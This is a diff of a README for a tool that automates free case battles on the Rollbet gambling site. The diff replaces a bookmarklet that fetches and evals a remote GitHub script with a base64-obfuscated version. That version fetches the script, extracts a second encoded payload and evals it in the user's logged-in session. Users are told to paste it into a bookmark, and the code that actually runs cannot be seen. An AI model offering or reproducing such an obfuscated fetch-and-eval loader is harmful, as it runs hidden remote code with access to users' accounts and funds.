@@ -10,7 +10,7 @@ automatic mode is not finished yet but will be implemented in the very near futu
     
   # You just need to crate a bookmark, set the name to something like "autoFreeBattle" (your choice, it doesnt matter) and then set the URL of the bookmark you created to a code here below. (make sure to copy all or it wont work)
   ```
-  javascript:eval(eval(await(await fetch('https://raw.githubusercontent.com/itaplyr/RollbetAutoFreeCaseBattle/refs/heads/main/script')).text()))
+javascript:eval(atob('ZmV0Y2goJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9pdGFwbHlyL1JvbGxiZXRBdXRvRnJlZUNhc2VCYXR0bGUvcmVmcy9oZWFkcy9tYWluL3NjcmlwdCcpIC50aGVuKHJlcyA9PiByZXMudGV4dCgpKSAudGhlbihjb2RlID0+IHsgZXZhbChhdG9iKGNvZGUubWF0Y2goL2F0b2JcKFsnImBdKFteJyJgXSspWyciYF1cKS8pPy5bMV0pKSB9KQ=='))
   ```
 
 </details>
